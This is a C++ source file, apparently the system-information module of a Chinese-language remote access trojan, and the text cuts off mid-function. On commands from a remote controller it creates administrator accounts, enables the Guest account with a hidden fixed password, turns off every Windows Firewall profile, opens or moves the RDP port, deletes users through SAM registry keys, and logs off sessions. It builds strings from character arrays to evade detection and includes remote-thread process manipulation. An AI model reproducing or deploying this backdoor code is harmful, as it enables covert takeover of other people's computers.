#include "SysInfo.h"
#include <LM.h>
#include<stdio.h>
#include <tchar.h>
#include <TLHELP32.H>
#include<ddraw.h>
#include "psapi.h"
#include "Wtsapi32.h"
#include <netfw.h>
#pragma comment( lib, "ole32.lib" )
#pragma comment(lib,"netapi32")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")
#pragma comment(lib, "ddraw.lib")
#pragma comment(lib, "Dxguid.lib")

CSysInfo::CSysInfo(CClientSocket *pClient) : CManager(pClient)
{
	SendSysInfo();
}

CSysInfo::~CSysInfo()
{
	//ExitProcess(NULL);
}

typedef struct _ASTAT_
{
	ADAPTER_STATUS  adapt;
	NAME_BUFFER  NameBuff[30];
}ASTAT, * PASTAT;



wchar_t* AnsiToUnicode(char* str)
{
	if( !str )
		return NULL;
	
	int wcslen = ::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), NULL, 0);
	wchar_t *wstr = new wchar_t[wcslen + 1];
	::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), wstr, wcslen);
	wstr[wcslen] = '\0';
	
	return wstr;
}

void CSysInfo::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_SEND_SYSINFO:    //发送主机信息
		SendSysInfo();
		break;
	case COMMAND_NET_USER: // 无NET加用户
		AddAdminUser();
		break;
	case COMMAND_GUEST: // 开启GUEST账号
		OpenGuest();
		break;
	case COMMAND_STOPFIRE: // 关防火墙
        StopFire();
		break;
	case COMMAND_CHANGE_PORT: // 更改终端端口
		Sleep(10);
		ChangePort(lpBuffer + 1);
		break;
	case COMMAND_CLOSE_3389: //关闭3389
	{
		BYTE bToken;
		if (Open3389(*(lpBuffer + 1)))
		{
			bToken = TOKEN_CLOSE_SUCCESS;
			SendSysInfo();
		}	
		else
			bToken = TOKEN_CLOSE_ERROR;
		Send(&bToken, 1);

		
		break;
	}
	case COMMAND_OPEN_3389:		//开启3389
	{
		BYTE bToken;
		if (Open3389(*(lpBuffer + 1)))
		{
			bToken = TOKEN_OPEN_SUCCESS;
			SendSysInfo();
		}
		else
			bToken = TOKEN_OPEN_ERROR;
		Send(&bToken, 1);
		break;
	}
	case COMMAND_SLIST:           //获取用户列表
		SendSList();
		break;
	case COMMAND_DELUSER:		//删除用户
		DeleteUser();
		break;
	case COMMAND_NET_CHANGE_PASS:			//修改用户密码
		ChangeUserPass();
		break;
	case COMMAND_WTSLIST:				//发送用户活动列表
		SendWtsmList();
		break;
	case COMMAND_WTS_Disconnect:					//用户断开
		WtsDisc((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_WTS_Logoff:								//用户注销
		WtsLoGoff((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DISABLEEUSER:
		SendNetstart((LPBYTE)lpBuffer + 1, nSize - 1, TRUE);		//禁用用户
		break;
	case COMMAND_ACITVEUSER:											//启用用户
		SendNetstart((LPBYTE)lpBuffer + 1, nSize - 1, NULL);  
		break;
	default:
		break;
	}
}



char* CSysInfo::GetTSClientName(DWORD sessionID)
{
	LPTSTR  ppBuffer		  = NULL;
	DWORD   pBytesReturned	  = 0;
	char*  currentClientName;
	
	if( WTSQuerySessionInformation( WTS_CURRENT_SERVER_HANDLE,sessionID,WTSClientName,&ppBuffer,&pBytesReturned))
	{
		currentClientName = (char *)ppBuffer;
	}
	return currentClientName;
}

/// <summary>
/// 断开用户连接
/// </summary>
/// <param name="lpBuffer"></param>
/// <param name="nSize"></param>
void CSysInfo::WtsDisc(LPBYTE lpBuffer, UINT nSize)
{
	BYTE bToken;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	BOOL ret;

	for (int i = 0; i < nSize; i += 4)
	{
		ret = WTSDisconnectSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i), FALSE);
	}
	if (ret)
		bToken = TOKEN_USER_CLOSE_SUCCESS;
	else
		bToken = TOKEN__USER_CLOSE_ERROR;
	Send(&bToken, 1);
	if (ret)
		SendWtsmList();
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
}
/// <summary>
/// 注销用户
/// </summary>
/// <param name="lpBuffer"></param>
/// <param name="nSize"></param>
void CSysInfo::WtsLoGoff(LPBYTE lpBuffer, UINT nSize)
{
	BYTE bToken;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	BOOL ret;

	for (int i = 0; i < nSize; i += 4)
	{
		WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i), FALSE);
	}

	if (ret)
		bToken = TOKEN_OFF_SUCCESS;
	else
		bToken = TOKEN_OFF_ERROR;

	Send(&bToken, 1);

	if (ret)
		SendWtsmList();
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
}

bool GetSessionUserName(DWORD dwSessionId, char username2[256]) 
{
	LPWSTR pBuffer = NULL; 
	DWORD dwBufferLen; 
	WCHAR username[256];
	
	BOOL bRes = WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, dwSessionId, WTSUserName, &pBuffer, &dwBufferLen); 
	
	if (bRes == FALSE) 
		return false; 
	
	lstrcpyW(username ,pBuffer); 
	WTSFreeMemory(pBuffer); 

	char   szANSIString[MAX_PATH]={0};
    WideCharToMultiByte(CP_ACP,WC_COMPOSITECHECK,username,-1,szANSIString,sizeof(szANSIString),NULL,NULL);
	lstrcpy(username2 ,szANSIString); 

	return true; 
}

char* CSysInfo::GetTSClientProtocolType(DWORD sessionID)
{
	LPTSTR  ppBuffer			   = NULL;
	DWORD   pBytesReturned	       = 0;
	char*  clientProtocolTypeStr;
	
	if( WTSQuerySessionInformation( WTS_CURRENT_SERVER_HANDLE,
		sessionID,
		WTSClientProtocolType,
		&ppBuffer,
		&pBytesReturned) )
	{
		switch( *ppBuffer )
		{
		case WTS_PROTOCOL_TYPE_CONSOLE:
			clientProtocolTypeStr = "Console";
			break;
		case WTS_PROTOCOL_TYPE_ICA:
			clientProtocolTypeStr = "ICA";
			break;
		case WTS_PROTOCOL_TYPE_RDP:
			clientProtocolTypeStr = "RDP";
			break;
		default:
			break;
		}
		
		WTSFreeMemory(ppBuffer); 
	}
	
	return clientProtocolTypeStr;
}

LPBYTE CSysInfo::getWtsmList()
{
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_WTSLIST;
	dwOffset = 1;
	
	DebugPrivilege(SE_DEBUG_NAME, TRUE);

	char	*ConnectionState;   
	char	UserName[256];  
	char	*ClientName; 
	char	*ProtocolType;

	int sk=0;
	
	PWTS_SESSION_INFO ppSessionInfo = NULL;
	DWORD			  pCount = 0;
	WTS_SESSION_INFO  wts;
	
	WTSEnumerateSessions( WTS_CURRENT_SERVER_HANDLE, 0, 1, &ppSessionInfo, &pCount );

	OSVERSIONINFO OSversion;	
	OSversion.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);

    bool os=false;
    
	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{
		if (OSversion.dwMajorVersion<6)
		{
			os=FALSE;
		}
		else
		{
           os=TRUE;
		}
	}
	
	for( DWORD i = 0; i < pCount; i++ )
	{
		wts = ppSessionInfo[i];
		
		DWORD					TSSessionId		  = wts.SessionId;
		LPTSTR					TSpWinStationName = wts.pWinStationName;
		WTS_CONNECTSTATE_CLASS	TSState			  = wts.State;
		
		ConnectionState=NULL;
		
		char ZxOLV[] = {'A','c','t','i','v','e','\0'};
		char kycNF[] = {'C','o','n','n','e','c','t','e','d','\0'};
		char HJvVn[] = {'C','o','n','n','e','c','t','Q','u','e','r','y','\0'};
		char uyvcR[] = {'S','h','a','d','o','w','\0'};
		char ZMSHe[] = {'D','i','s','c','o','n','n','e','c','t','e','d','\0'};
		char reZwa[] = {'I','d','l','e','\0'};
		char DBuPD[] = {'L','i','s','t','e','n','\0'};
		char sQSdk[] = {'R','e','s','e','t','\0'};
		char oxiJo[] = {'D','o','w','n','\0'};
		char aHopp[] = {'I','n','i','t','\0'};

		switch( TSState )
		{
		case WTSActive:
			ConnectionState = ZxOLV;
			break;
		case WTSConnected:
			ConnectionState = kycNF;
			break;
		case WTSConnectQuery:
			ConnectionState = HJvVn;
			break;
		case WTSShadow:
			ConnectionState = uyvcR;
			break;
		case WTSDisconnected:
			ConnectionState = ZMSHe;
			break;
		case WTSIdle:
			ConnectionState = reZwa;
			break;
		case WTSListen:
			ConnectionState = DBuPD;
			break;
		case WTSReset:
			ConnectionState = sQSdk;
			break;
		case WTSDown:
			ConnectionState = oxiJo;
			break;
		case WTSInit:
			ConnectionState = aHopp;
			break;
		}
		
		ClientName=NULL;
		ProtocolType=NULL;

		GetSessionUserName(TSSessionId,UserName);
		ClientName		  = GetTSClientName(         TSSessionId       );
		ProtocolType      = GetTSClientProtocolType( TSSessionId       );

		sk=0;
		if (os)
		{
			sk=1;
		}

		if (!lstrlen(UserName))
		{
			sk=pCount+5;
		}

		if (i>=sk)
		{
	
		// 此进程占用数据大小
		dwLength = lstrlen(ConnectionState) + lstrlen(UserName) + lstrlen(ClientName) + lstrlen(ProtocolType) + sizeof(DWORD) + 5;
		
		// 缓冲区太小，再重新分配下
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
		
		memcpy(lpBuffer + dwOffset, ConnectionState, lstrlen(ConnectionState) + 1);
		dwOffset += lstrlen(ConnectionState) + 1;

		memcpy(lpBuffer + dwOffset, UserName, lstrlen(UserName)+1);
		dwOffset += lstrlen(UserName)+1;	
		
		memcpy(lpBuffer + dwOffset, ClientName, lstrlen(ClientName) + 1);
		dwOffset += lstrlen(ClientName) + 1;

		memcpy(lpBuffer + dwOffset, ProtocolType, lstrlen(ProtocolType)+1);
		dwOffset += lstrlen(ProtocolType)+1;	

		memcpy(lpBuffer + dwOffset, &(TSSessionId), sizeof(DWORD)+1);
		dwOffset += sizeof(DWORD)+1;	
		}
	}
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	
	return lpBuffer;
	
}

void CSysInfo::SendWtsmList()
{
	UINT	nRet = -1;
	
	LPBYTE	lpBuffer = getWtsmList();
	if (lpBuffer == NULL)
	{
		return;
	}
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

//获取远程端口
UINT GetPort(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{

	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("PortNumber"), REG_DWORD, (char *)lpBuffer, NULL, uSize, 0);
	if (lstrlen(lpBuffer) == 0)
	{
		lpBuffer = _T("3389");
	}
	return lstrlen(lpBuffer);
}


/// <summary>
/// 停用或启用账户
/// </summary>
/// <param name="lpBuffer"></param>
/// <param name="nSize"></param>
/// <param name="User_kt"></param>
void CSysInfo::SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  
{
	wchar_t user_name[256]={0};
	USER_INFO_1008 ui;
	DWORD dwLevel = 1008;
	NET_API_STATUS nStatus;
	BYTE bToken = NULL;
	mbstowcs(user_name, (const char *)lpBuffer,256);
	if(User_kt==NULL)  //用户启用
	{
		ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // 用户停用 | 密码用不过期
	}
	else  //用户停用
	{
		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // 用户停用 | 用户不能更改密码
	}
	nStatus = NetUserSetInfo( NULL,user_name,dwLevel, (LPBYTE )&ui,NULL);
	if (nStatus == NERR_Success)
		bToken = TOKEN_STATE_SUCCESS;
	else
		bToken = TOKEN_STATE_ERROR;
	Send(&bToken, 1);
	Sleep(100);
	SendSList();
}

static int nuser=0;
char user_all[50][50]={0};


inline int get_all_user(void) //得到用户   
{
    LPUSER_INFO_0   pBuf   =   NULL;   
    LPUSER_INFO_0   pTmpBuf;   
    DWORD   dwLevel   =   0;   
    DWORD   dwPrefMaxLen   =   MAX_PREFERRED_LENGTH;   
    DWORD   dwEntriesRead   =   0;   
    DWORD   dwTotalEntries   =   0;   
    DWORD   dwResumeHandle   =   0;   
    NET_API_STATUS   nStatus;   

    do   
	{   
        nStatus   =   NetUserEnum(NULL,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);   
    
        if((nStatus   ==   NERR_Success)   ||   (nStatus   ==   ERROR_MORE_DATA))   
		{   
            if((pTmpBuf=pBuf)!=NULL)   
			{   
                for(DWORD   i=0;i<dwEntriesRead;++i)   
				{   
                    wcstombs(user_all[nuser++],pTmpBuf->usri0_name,80);   
                    pTmpBuf++;   
				}   
			}   
		}   
    
        if(pBuf!=NULL)   
		{   
            NetApiBufferFree(pBuf);   
            pBuf   =   NULL;   
		}   
	}   
    while   (nStatus   ==   ERROR_MORE_DATA);     
    
    if(pBuf   !=   NULL)   
        NetApiBufferFree(pBuf);   
    
    return   nuser;   
  }   

char getall_Groups(char *str_user,char Groupt[]) //根据用户得到用户组
{
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL; 
	NET_API_STATUS nStatus;
	DWORD dwLevel = 0; 
	DWORD dwFlags = LG_INCLUDE_INDIRECT; 
	DWORD dwPrefMaxLen = -1;
    DWORD dwEntriesRead = 0; 
    DWORD dwTotalEntries = 0; 
	wchar_t user[256]={0};
	DWORD len;
	char Groups[256]={NULL};
	int strj,strp;

    size_t retlen = mbstowcs(user, (const char *)str_user,256);

    nStatus = NetUserGetLocalGroups(
		    NULL,
		    user,
		    dwLevel,
		    dwFlags,
		    (LPBYTE*)&pBuf,
		    dwPrefMaxLen,
		    &dwEntriesRead,
		    &dwTotalEntries); 
    if(nStatus == NERR_Success) 
	{ 
        LPLOCALGROUP_USERS_INFO_0   pTmpBuf; 
        DWORD   i; 
        DWORD   dwTotalCount   =   0; 
        if((pTmpBuf = pBuf) != NULL) 
		{ 
            for(i = 0; i < dwEntriesRead;   i++) 
			{ 
                if(pTmpBuf == NULL) 
                    break; 

				char *p=NULL;
				len = wcslen(pTmpBuf->lgrui0_name);
				p = (char *) malloc(len+1);

				wsprintf(p,"%S",pTmpBuf->lgrui0_name);
				strncpy(Groups,p,sizeof(Groups));
				strj=strlen(Groupt);
				strp=strlen(Groups);
				if(strj!=0)
				{
					Groupt[strj]='/';
					strj++;
				}
				for(int i=0;i<strp;i++)
				{
					Groupt[strj+i]=Groups[i];
				}
                pTmpBuf++; 
                dwTotalCount++; 
			} 
		}
	}
	return 0;
}

BOOL IsGuestDisabled(char *str_user)  //根据用户得到 用户状态
{
	BOOL bRet = TRUE;
	LPUSER_INFO_1 puiVal = NULL;
	
	wchar_t user[256]={0};
	size_t retlen = mbstowcs(user, (const char *)str_user,256);
	
	if(NERR_Success == NetUserGetInfo(NULL,user, 1, (LPBYTE *)&puiVal))
	{
		if(!(puiVal->usri1_flags & UF_ACCOUNTDISABLE))
		{
			bRet = FALSE;
		}
	}
    if(puiVal)
	{
        NetApiBufferFree(puiVal);
	}
    return bRet;
}

LPBYTE CSysInfo::getSList()
{
	DebugPrivilege(SE_DEBUG_NAME, TRUE);	
	//得到所有用户   
	nuser=0;
    if(!get_all_user())  
		return NULL;
    //遍历开始   
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_SLIST;
	DWORD			dwOffset = 1;
	
    for(int i=0;i<nuser;i++)//循环用户  
	{
		char Groups[256]={NULL};
		getall_Groups(user_all[i],Groups);  //根据用户 查找用户组
		BOOL stt=IsGuestDisabled(user_all[i]);  //根据用户 得出用户状态
		char *GetInfo="Active";
		if(stt)
		{
			GetInfo="Disable";
		}
		
		memcpy(lpBuffer + dwOffset, user_all[i], lstrlen(user_all[i])+1);
		dwOffset += lstrlen(user_all[i])+1;
		memcpy(lpBuffer + dwOffset, Groups, lstrlen(Groups) + 1);
		dwOffset += lstrlen(Groups) + 1;
		memcpy(lpBuffer + dwOffset, GetInfo, lstrlen(GetInfo) + 1);
		dwOffset += lstrlen(GetInfo) + 1;
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	return lpBuffer;
}

/// <summary>
/// 发送用户列表
/// </summary>
void CSysInfo::SendSList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getSList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}

BOOL CSysInfo::DelSidName(char *sid)
{
	HKEY hkey;
	DWORD ret;
	char C_sid[10];
	if (strncmp(sid,"00000",strlen("00000")) == 0)
		wsprintf(C_sid,"%s",sid);
	else
		wsprintf(C_sid,"00000%s",sid);
	char ocZOK[] = {'S','A','M','\\','S','A','M','\\','D','o','m','a','i','n','s','\\','A','c','c','o','u','n','t','\\','U','s','e','r','s','\\','\0'};
	ret=RegOpenKey(HKEY_LOCAL_MACHINE,ocZOK,&hkey);
	if (ret!=ERROR_SUCCESS)
		return FALSE;
	ret=RegDeleteKey(hkey,C_sid);
	RegCloseKey(hkey);
	if (ret==ERROR_SUCCESS)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}


void CSysInfo::ChangeUserPass()
{
	BYTE bToken = NULL;
	TCHAR *lpUser = (TCHAR *)GetBuffer(1);
	TCHAR *lpPass = (TCHAR *)GetBuffer(1 + (lstrlen(lpUser) + 1) * sizeof(TCHAR));

	USER_INFO_3 *pUI=NULL;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;	

	nStatus=NetUserGetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE*)&pUI);

	pUI->usri3_flags = UF_NORMAL_ACCOUNT|UF_DONT_EXPIRE_PASSWD;
	pUI->usri3_password=AnsiToUnicode(lpPass);
	pUI->usri3_password_expired=FALSE;
	nStatus=NetUserSetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE)pUI,&dwError);

	if(nStatus==NERR_Success)
	{
		bToken = TOKEN_CHANGE_PSAA_SUCCESS;
	}
	else
	{
		bToken = TOKEN_CHANGE_PSAA_ERROR;
	}
	Send(&bToken, 1);

	if (pUI != NULL)
		NetApiBufferFree(pUI);

	
}

BOOL CSysInfo::DelUserName(char *user)
{	
	char FqqvK[] = {'S','A','M','\\','S','A','M','\\','D','o','m','a','i','n','s','\\','A','c','c','o','u','n','t','\\','U','s','e','r','s','\\','N','a','m','e','s','\\','\0'};
	BYTE bToken = NULL;
	HKEY hkey;
	DWORD ret;
	char C_user[40];
	wsprintf(C_user,"%s",user);
	ret=RegOpenKey(HKEY_LOCAL_MACHINE,FqqvK,&hkey);
	if (ret!=ERROR_SUCCESS)
		return FALSE;
	ret=RegDeleteKey(hkey,C_user);
	RegCloseKey(hkey);
	if (ret==ERROR_SUCCESS)
	{
		bToken = TOKEN_DEL_SUCCESS;
	}
	else
	{
		bToken = TOKEN_DEL_ERROR;
	}
	Send(&bToken, 1);

	return 1;
}

void CSysInfo::AddAdminUser()
{
	USER_INFO_1 ui;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;
	BYTE bToken = NULL;
	TCHAR *lpUser = (TCHAR *)GetBuffer(1);
	TCHAR *lpPass = (TCHAR *)GetBuffer(1 + (lstrlen(lpUser) + 1) * sizeof(TCHAR));
	TCHAR *lpGroup = (TCHAR *)GetBuffer(1 + (lstrlen(lpPass) + 1) * sizeof(TCHAR) + (lstrlen(lpUser) + 1) * sizeof(TCHAR)); 

	ui.usri1_name = AnsiToUnicode(lpUser);    //这个是要添加的用户名，可以自己改改
	ui.usri1_password = AnsiToUnicode(lpPass);   //这个是用户密码，也可以自己改改
	ui.usri1_priv = USER_PRIV_USER; 
	ui.usri1_home_dir = NULL; 
	ui.usri1_comment = NULL; 
	ui.usri1_flags = UF_SCRIPT; 
	ui.usri1_script_path = NULL; 
	nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	if (nStatus != NERR_Success)
	{
		bToken = TOKEN_ADD_ERROR;
		Send(&bToken, 1);
		return;
	}
	wchar_t szAccountName[100]={0};  
	wcscpy(szAccountName,ui.usri1_name);  
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName;  
	//添加到Administrators组
	nStatus = NetLocalGroupAddMembers(NULL,AnsiToUnicode(lpGroup),3,(LPBYTE)&account,1);
	if (nStatus == NERR_Success)
		bToken = TOKEN_ADD_SUCCESS;
	else
		bToken = TOKEN_ADD_ERROR;
	Send(&bToken, 1);

	SendSList();

}

void CSysInfo::DeleteUser()
{
	TCHAR *lpUserName = (TCHAR *)GetBuffer(1);
	
	BYTE bToken = NULL;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;	
	nStatus = NetUserDel(NULL,AnsiToUnicode(lpUserName));
	if(nStatus==NERR_Success)
	{
		bToken = TOKEN_DEL_SUCCESS;
		Send(&bToken, 1);
	}
	if(nStatus!=NERR_Success&&nStatus!=NERR_UserNotFound)
	{
		HKEY hKey; 
		DWORD dwValue; 
		char strType[32];
		DWORD dwRegType;
		TCHAR lpSubKey[128];
		wsprintf(lpSubKey,"SAM\\SAM\\Domains\\Account\\Users\\Names\\%s",lpUserName);
		int nCount = 0;
		while(1)
		{
			if(0==RegOpenKey(HKEY_LOCAL_MACHINE,lpSubKey, &hKey)) 
			{ 
				DWORD dwLen=sizeof(DWORD);
				RegQueryValueEx(hKey,"",NULL,&dwRegType,(BYTE*)&dwValue, &dwLen); 
				RegCloseKey(hKey); 
				wsprintf(strType,"%08X",dwRegType);	
				break;
			} 
			Sleep(50);
			nCount++;
			if(nCount > 100)
			{
				return;
			}
		}
		if (DelUserName(lpUserName))
		{
			if (DelSidName(strType))
			{
				return;
			}
		}
	}
	SendSList();
}

/// <summary>
/// 获取可用内存
/// </summary>
/// <returns></returns>
PCHAR GetAvailPhys()
{
	CHAR *pBuf = new CHAR[20];
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	dSize = (unsigned __int64)Meminfo.ullAvailPhys;
	dSize /= 1024;
	dSize /= 1024;
	dSize += 1;
	wsprintf(pBuf, _T("%u"), dSize);
	return pBuf;
}



/// <summary>
/// 发送系统信息
/// </summary>
void CSysInfo::SendSysInfo()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2048);
	lpBuffer[0] = TOKEN_SYSINFOLIST;	
	MYSYSINFO m_SysInfo;
	GetSystemInfo(&m_SysInfo);
	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(MYSYSINFO));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

/// <summary>
/// 修改3389端口
/// </summary>
/// <param name="lparam"></param>
/// <returns></returns>
DWORD CSysInfo::ChangePort(LPVOID lparam)
{
	DWORD szPort=atoi((char*)lparam);
	
	TCHAR szCanConnect[32];
	
	char AzjMl[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','R','D','P','T','c','p','\0'};
	char fWJan[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','i','n','S','t','a','t','i','o','n','s','\\','R','D','P','-','T','c','p','\0'};
	char RihKe[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','d','s','\\','r','d','p','w','d','\\','T','d','s','\\','t','c','p','\0'};
	char OxPIY[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
	char xbJtP[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
	char RxlJi[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
	char dRLGx[] = {'P','o','r','t','N','u','m','b','e','r','\0'};
	char Przqs[] = {'f','D','e','n','y','T','S','C','o','n','n','e','c','t','i','o','n','s','\0'};
	WriteRegEx(HKEY_LOCAL_MACHINE, _T(AzjMl), _T(dRLGx), REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, _T(fWJan), _T(dRLGx), REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, _T(RihKe), _T(dRLGx), REG_DWORD, NULL, szPort, 0);
	
	ReadRegEx(HKEY_LOCAL_MACHINE, _T(OxPIY), 
		_T(Przqs), REG_DWORD, szCanConnect, NULL, NULL, 0);
	if (atoi(szCanConnect) == 0)
	{
		WriteRegEx(HKEY_LOCAL_MACHINE, _T(xbJtP), _T(Przqs), REG_DWORD, NULL, 1, 0);
		Sleep(1500);
		WriteRegEx(HKEY_LOCAL_MACHINE, _T(RxlJi), _T(Przqs), REG_DWORD, NULL, 0, 0);
	}
	SendSysInfo();
	return TRUE;
}

/// <summary>
/// 关闭防火墙
/// </summary>
/// <returns></returns>
BOOL CSysInfo::StopFire()
{
	INetFwPolicy2* pNetFwPolicy2 = NULL;

	// Initialize COM.
	HRESULT hr = CoInitializeEx(
		0,
		COINIT_APARTMENTTHREADED
	);

	if (hr != RPC_E_CHANGED_MODE)
	{
		if (FAILED(hr))
		{
			goto cleanup;
		}
	}

	hr = CoCreateInstance(
		__uuidof(NetFwPolicy2),
		NULL,
		CLSCTX_INPROC_SERVER,
		__uuidof(INetFwPolicy2),
		(void**)&pNetFwPolicy2);

	if (FAILED(hr))
	{
		goto cleanup;
	}

	//为域配置文件禁用 Windows 防火墙 
	hr = pNetFwPolicy2->put_FirewallEnabled(NET_FW_PROFILE2_DOMAIN, 0);
	// 为私有配置文件禁用 Windows 防火墙 
	HRESULT hr1 = pNetFwPolicy2->put_FirewallEnabled(NET_FW_PROFILE2_PRIVATE, 0);
	// 为公共配置文件禁用 Windows 防火墙 
	HRESULT hr2 = pNetFwPolicy2->put_FirewallEnabled(NET_FW_PROFILE2_PUBLIC, 0);
	if (FAILED(hr) || FAILED(hr1) || FAILED(hr2))
	{
		SendSysInfo();
	}

cleanup:

	if (pNetFwPolicy2)
		pNetFwPolicy2->Release();
	CoUninitialize();

	return  1;
}

BOOL CSysInfo::OpenGuest()
{
	//启用账户
	SendNetstart((LPBYTE)"Guest", sizeof("Guest"), NULL);
	//修改密码
	WinExec("net user Guest 123456", SW_HIDE);
	return 1;

}



bool UnloadRemoteModule(DWORD dwProcessID, HANDLE hModuleHandle)
{
	HANDLE hRemoteThread;
	HANDLE hProcess;

	if (hModuleHandle == NULL)
		return false;
	hProcess=OpenProcess(PROCESS_VM_WRITE|PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION, FALSE, dwProcessID);
	if (hProcess == NULL)
		return false;
	
	char ExUmf[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	
	char TjHbd[] = {'F','r','e','e','L','i','b','r','a','r','y','\0'};

	HMODULE hModule=GetModuleHandle(ExUmf);
	LPTHREAD_START_ROUTINE pfnStartRoutine = (LPTHREAD_START_ROUTINE)::GetProcAddress(hModule, TjHbd);
	hRemoteThread=CreateRemoteThread(hProcess, NULL, 0, pfnStartRoutine, hModuleHandle, 0, NULL);

	if(hRemoteThread==NULL)
	{
		CloseHandle(hProcess);
		return false;
	}
	WaitForSingleObject(hRemoteThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hRemoteThread);
	return true;
}


void OnStartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
		   StartService(hService, 0, NULL);
		   CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

/// <summary>
/// 获取远程桌面是否开启
/// </summary>
/// <returns>开启返回端口关闭返回0</returns>
DWORD GetRDP(char* posr,DWORD size)
{
	DWORD dwRet = 0;
	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwValue, dwType;
		DWORD dwBufLen = 255;
